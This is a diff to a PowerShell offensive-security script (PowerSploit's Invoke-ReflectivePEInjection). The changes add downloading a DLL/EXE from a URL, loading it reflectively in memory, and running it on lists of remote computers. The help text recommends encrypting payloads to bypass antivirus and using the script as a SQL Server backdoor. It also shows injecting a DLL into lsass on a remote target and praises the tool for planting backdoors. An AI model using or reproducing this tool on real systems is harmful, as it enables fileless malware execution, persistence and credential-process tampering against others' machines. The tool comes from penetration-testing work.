@@ -7,8 +7,13 @@ This script has two modes. It can reflectively load a DLL/EXE in to the PowerShe
 or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
 please lead the Notes section (GENERAL NOTES) for information on how to use them.
 
+
 1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
 Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.
+
+This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
+this will load and execute the DLL/EXE in to memory without writing any files to disk.
+
 
 2.) Reflectively load a DLL in to memory of a remote process.
 As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.
@@ -17,20 +22,38 @@ This is probably most useful for injecting backdoors in SYSTEM processes in Sess
 from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
 remote process. 
 
+
+While this script provides functionality to specify a file to load from disk a URL, or a byte array, these are more for demo purposes. The way I'd recommend using the script is to create a byte array
+containing the file you'd like to reflectively load, and hardcode that byte array in to the script. One advantage of doing this is you can encrypt the byte array and decrypt it in memory, which will
+bypass A/V. Another advantage is you won't be making web requests. The script can also load files from SQL Server and be used as a SQL Server backdoor. Please see the Casaba
+blog linked below (thanks to whitey).
+
 PowerSploit Function: Invoke-ReflectivePEInjection
-Original author: Joe Bialek, Twitter: @JosephBialek
-Code review and modifications: Matt Graeber, Twitter: @mattifestation
+Author: Joe Bialek, Twitter: @JosephBialek
 License: BSD 3-Clause
 Required Dependencies: None
 Optional Dependencies: None
+Version: 1.4
 
 .DESCRIPTION
 
 Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.
 
+.PARAMETER PEPath
+
+The path of the DLL/EXE to load and execute. This file must exist on the computer the script is being run on, not the remote computer.
+
+.PARAMETER PEUrl
+
+A URL containing a DLL/EXE to load and execute.
+
 .PARAMETER PEBytes
 
 A byte array containing a DLL/EXE to load and execute.
+
+.PARAMETER ComputerName
+
+Optional, an array of computernames to run the script on.
 
 .PARAMETER FuncReturnType
 
@@ -55,30 +78,43 @@ Optional, the process ID of the remote process to inject the DLL in to. If not i
 Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
     if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
     loading in to a remote process.
+	
+.EXAMPLE
+
+Load DemoDLL from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().
+Note that the file name on the website can be any file extension.
+Invoke-ReflectivePEInjection -PEUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString
 
 .EXAMPLE
 
-Load DemoDLL and run the exported function WStringFunc, print the wchar_t* returned by WStringFunc().
-$PEBytes = [IO.File]::ReadAllBytes('C:\DemoDLL.dll')
-$Result = Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString
-Write-Output $Result
+Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
+Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local
+
+.EXAMPLE
+
+Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
+	the wchar_t* returned by WStringFunc() from all the computers.
+Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)
 
 .EXAMPLE
 
 Load DemoEXE and run it locally.
-$PEBytes = [IO.File]::ReadAllBytes('C:\DemoEXE.exe')
-Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"
+Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4"
 
 .EXAMPLE
 
-$PEBytes = [IO.File]::ReadAllBytes('C:\DemoEXE.exe')
-Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR
+Load DemoEXE and run it locally. Forces ASLR on for the EXE.
+Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR
 
 .EXAMPLE
 
 Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
-$PEBytes = [IO.File]::ReadAllBytes('C:\DemoDLL_RemoteProcess.dll')
-Invoke-ReflectivePEInjection -PEPath $PEBytes -ProcName lsass
+Invoke-ReflectivePEInjection -PEPath DemoDLL_RemoteProcess.dll -ProcName lsass -ComputerName Target.Local
+
+.EXAMPLE
+
+Load a PE from a byte array.
+Invoke-ReflectivePEInjection -PEPath (Get-Content c:\DemoEXE.exe -Encoding Byte) -ExeArgs "Arg1 Arg2 Arg3 Arg4"
 
 .NOTES
 GENERAL NOTES:
@@ -97,6 +133,8 @@ The script has 3 basic sets of functionality:
 	-Does NOT clean up memory in the remote process if/when DLL finishes execution.
 	-Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
 	-Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.
+
+
 
 DLL LOADING NOTES:
 
@@ -144,35 +182,49 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 
 #>
 
-[CmdletBinding()]
+[CmdletBinding(DefaultParameterSetName="WebFile")]
 Param(
-    [Parameter(Position = 0, Mandatory = $true)]
+	[Parameter(ParameterSetName = "LocalFile", Position = 0, Mandatory = $true)]
+	[String]
+	$PEPath,
+	
+	[Parameter(ParameterSetName = "WebFile", Position = 0, Mandatory = $true)]
+	[Uri]
+	$PEUrl,
+
+    [Parameter(ParameterSetName = "Bytes", Position = 0, Mandatory = $true)]
     [ValidateNotNullOrEmpty()]
     [Byte[]]
     $PEBytes,
 	
 	[Parameter(Position = 1)]
+	[String[]]
+	$ComputerName,
+	
+	[Parameter(Position = 2)]
     [ValidateSet( 'WString', 'String', 'Void' )]
 	[String]
 	$FuncReturnType = 'Void',
 	
-	[Parameter(Position = 2)]
+	[Parameter(Position = 3)]
 	[String]
 	$ExeArgs,
 	
-	[Parameter(Position = 3)]
+	[Parameter(Position = 4)]
 	[Int32]
 	$ProcId,
 	
-	[Parameter(Position = 4)]
+	[Parameter(Position = 5)]
 	[String]
 	$ProcName,
 
+    [Parameter(Position = 6)]
     [Switch]
     $ForceASLR
 )
 
 Set-StrictMode -Version 2
+
 
 $RemoteScriptBlock = {
 	[CmdletBinding()]
@@ -2848,6 +2900,18 @@ Function Main
 	
 	Write-Verbose "PowerShell ProcessID: $PID"
 	
+	if ($PsCmdlet.ParameterSetName -ieq "LocalFile")
+	{
+		Get-ChildItem $PEPath -ErrorAction Stop | Out-Null
+		[Byte[]]$PEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $PEPath))
+	}
+	elseif ($PsCmdlet.ParameterSetName -ieq "WebFile")
+	{
+		$WebClient = New-Object System.Net.WebClient
+		
+		[Byte[]]$PEBytes = $WebClient.DownloadData($PEUrl)
+	}
+	
 	#Verify the image is a valid PE file
 	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''
 
@@ -2871,7 +2935,14 @@ Function Main
 		$ExeArgs = "ReflectiveExe"
 	}
 
-	Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
+	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
+	{
+		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
+	}
+	else
+	{
+		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
+	}
 }
 
 Main
